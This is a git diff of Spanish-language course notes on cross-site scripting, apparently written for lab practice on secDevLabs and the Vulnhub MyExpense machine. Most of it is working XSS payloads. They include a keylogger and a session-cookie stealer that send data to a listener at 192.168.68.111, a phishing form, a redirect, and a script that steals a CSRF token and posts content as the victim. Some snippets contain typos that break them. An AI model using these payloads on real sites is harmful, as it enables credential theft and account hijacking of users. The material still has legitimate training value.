@@ -19,14 +19,15 @@ A continuación, se proporciona el proyecto de Github correspondiente al laborat
 -   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
 
 
-## Comandos 
+## JavaScript en la web
 
 Los XSS pueden interpretar codigo en **HTML y/o  JavaScript** y es ahi en donde podemos colocar las ineycciones.
 
 ```javascript
-<script>alert("XSS")</script>                                                      # Creamos una ventana emergente con codigo javascript que dice XSS
+<script>alert("XSS")</script>                                /// Creamos una ventana emergente con codigo javascript que dice XSS
 ```
 
+----
 Podemos crear un script en donde nos devuleva el correo o algun dato a nuestra IP con un servidor hecho con http,  colocamos la IP de nuestro servidor en fetch
 ```javascript
 <script>
@@ -44,7 +45,7 @@ Podemos crear un script en donde nos devuleva el correo o algun dato a nuestra I
 ❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
 ```
 
-
+----
 Tambien lo podemos hacer con HTML (Phishing)
 ```html
 <div id="formContainer"></div>
@@ -72,12 +73,12 @@ Tambien lo podemos hacer con HTML (Phishing)
 ❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
 ```
 
-
+----
 Podemos crear un Keylogger JavaScript
 ```javascript
 <script>
    var k = "";    document.onkeypress = funtion(e){
-        e = e || window.event; # Opcional para que en cualquier navegador funcione el Keylogger
+        e = e || window.event;                        // Opcional para que en cualquier navegador funcione el Keylogger
         k += e.key;
         var i = new Image();
         i.src = "http://192.168.68.111/" + k;
@@ -89,8 +90,89 @@ Podemos crear un Keylogger JavaScript
 ❯ python3 -m http.server 80  | grep -oP "GET /\k[^.*\s]+"      # Nos montamos un servidor http 80 para recibir las peticiones y que las filtre 
 ```
 
-
-ss
+----
+Podemos crear un Script para redirigir al usuario
 ```javascript
-
+<script>
+	window.location.href = "https://hack4u.io";
+</script>
 ```
+
+
+
+## JavaScript 
+
+Web para identificar un [Json Web Token](https://jwt.io/), este se encuentra en: **Ctrl + Shift + c > Application/Storage > Session**
+
+External JavaScript Source, podemos cargar codigo desde un servidor externo para tratar de robarle la cookie de sesion.
+* Debemos de ver en la web que no tenga activa el **httpOnly** y se encuentra en **Application** ya que eso impediria poder robarla.
+* Esto seria un **Cookie Hijacking**
+
+Esto lo colcaremos en la web de prueba y crearemos la publicacion
+```javascript
+<script src="http://192.168.68.111/test.js"></script>
+```
+* Cuando creas el archivo .js ya no es necesario poner las cabeceras <script></script> y lo podemos pegar directamente en la web de prueba
+```bash
+❯ nvim test.js                                                  # Creamos el archivo js
+```
+
+Con este robamos la Cookie de Sesion del usuario.
+```javascript
+var request = new XMLHttpRequest();
+request.open('GET', 'http://192.168.68.111/?cookie=' + document.cookie);
+request.send();         
+```
+
+```bash
+❯ python3 -m http.server 80                                     # Nos montamos un servidor http 80 para recibir las peticiones 
+```
+Despues de tener la **Cookie de Session** podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y asi cuando recarguemos la pagina, estaremos como el otro usuario.
+
+----
+
+Esto lo colcaremos en la web de prueba y crearemos la publicacion
+```javascript
+<script src="http://192.168.68.111/pwned.js"></script>
+```
+
+* Cuando creas el archivo .js ya no es necesario poner las cabeceras <script></script>
+```bash
+❯ nvim pwned.js                                                  # Creamos el archivo js
+```
+
+Esto se usa una vez obtenido la **csrf_token y value**
+```javascript
+var domain = "http://localhost:10007/newgossip";
+var req1 = new XMLHttpRequest();
+req1.open('GET', domain, false);
+req1.withcredentials = true;                               // Por si el Token es Dinamico y asi lo volvemos Estatico
+req1.send();
+
+var response = req1.responseText;
+var parser = new DOMParser();
+var doc = parser.parserFromString(respose, 'text/html');
+var token = doc.getElementsByName("_csrf_token")[0].value;
+
+var req2 = new XMLHttpRequest();
+var data = "title=HACKED&subtitle=HaCkEd&text=HAC%20ked&_csrf_token=" + token;   // El %20 es un espacio en urlencode
+req2.open('POST', 'http://localhost:10007/newgossip', false); 
+req2.withcredentials = true;
+req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+req2.send(data);
+```
+
+```bash
+❯ python3 -m http.server 80                                     # Nos montamos un servidor http 80 para recibir las peticiones 
+```
+
+----
+En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.
+
+Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.
+
+A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:
+
+-   **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
+
+
